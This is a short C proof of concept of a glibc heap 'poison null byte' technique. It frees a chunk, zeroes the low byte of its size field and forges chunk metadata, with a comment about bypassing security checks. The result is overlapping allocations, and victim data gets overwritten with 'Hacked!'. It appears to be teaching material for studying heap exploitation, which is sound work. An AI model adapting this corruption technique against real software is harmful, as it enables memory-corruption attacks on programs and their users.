#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

typedef long long LONG;
const LONG SIZE = 0x100;
const char payload[9] = "Hacked!\n";

struct Chunk
{
	LONG pre_size, size;
	struct Chunk *fd, *bk;
};

int main()
{
	void *a = malloc(SIZE);
	void *b = malloc(2*SIZE);
	void *c = malloc(SIZE);

	struct Chunk *B = (struct Chunk *)(b - 2*8);
	struct Chunk *C = (struct Chunk *)(c - 2*8);

	free(b);
	*(char *)&B->size = 0x00;

	// Additional fix to bypass some security checks
	*(LONG *)((LONG *)C - 2) = 0x200;
	*(LONG *)((LONG *)C - 1) = 0x120;
	
	void *b1 = malloc(SIZE/2);
	void *b2 = malloc(SIZE/2);

	strcpy(b2, "Victim's data\n");
	write(1, b2, 14);

	free(b1);
	free(c);
	
	b = malloc(2*SIZE);
	for(int i=0; i<2*SIZE; ++i)
		*(char *)(b + i) = payload[i%8];
	
	write(1, b2, 14);
}
